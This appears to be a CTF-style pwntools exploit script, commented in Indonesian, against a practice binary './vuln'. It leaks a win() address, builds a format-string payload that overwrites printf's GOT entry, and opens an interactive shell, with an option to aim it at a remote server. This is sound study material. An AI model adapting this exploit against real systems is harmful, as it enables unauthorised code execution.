from pwn import *

# === CONFIGURATION ===
exe = './vuln'
elf = ELF(exe)
context.binary = elf # Otomatis mengatur arch, endian, dll.

# Ganti 'local' ke 'remote' untuk menembak server NC
mode = 'local' 

if mode == 'local':
    p = process(exe)
else:
    # Contoh: nc 10.10.10.10 1337
    p = remote('10.10.10.10', 1337)

# --- LANGKAH 1: Ambil Leak Alamat win() ---
# Berdasarkan source code, program nge-print alamat win() di awal
p.recvuntil(b"Alamat win() ada di: ")
win_addr = int(p.recvline().strip(), 16)
log.success(f"Alamat win() yang bocor: {hex(win_addr)}")

# --- LANGKAH 2: Tentukan Target (GOT printf) ---
# Kita ambil alamat GOT printf otomatis dari file binary
target_got = elf.got['printf']
log.info(f"Target yang akan dibajak (GOT printf): {hex(target_got)}")

# --- LANGKAH 3: Buat Payload Format String ---
# Misal dari hasil pengecekan manual, offset input kita di stack adalah 6
offset = 6

# fmtstr_payload(offset, {alamat_tujuan: nilai_baru})
# Fungsi ini otomatis menghitung jumlah karakter %n untuk menulis win_addr ke target_got
payload = fmtstr_payload(offset, {target_got: win_addr})

# --- LANGKAH 4: Kirim dan Eksekusi ---
log.info("Mengirim payload untuk membajak GOT...")
p.sendlineafter(b"Masukkan nama Anda: ", payload)

# Setelah printf(buffer) dipanggil, GOT printf sudah berubah menjadi win()
# Maka saat printf("\nProgram selesai...") dipanggil, shell akan terbuka!
p.interactive()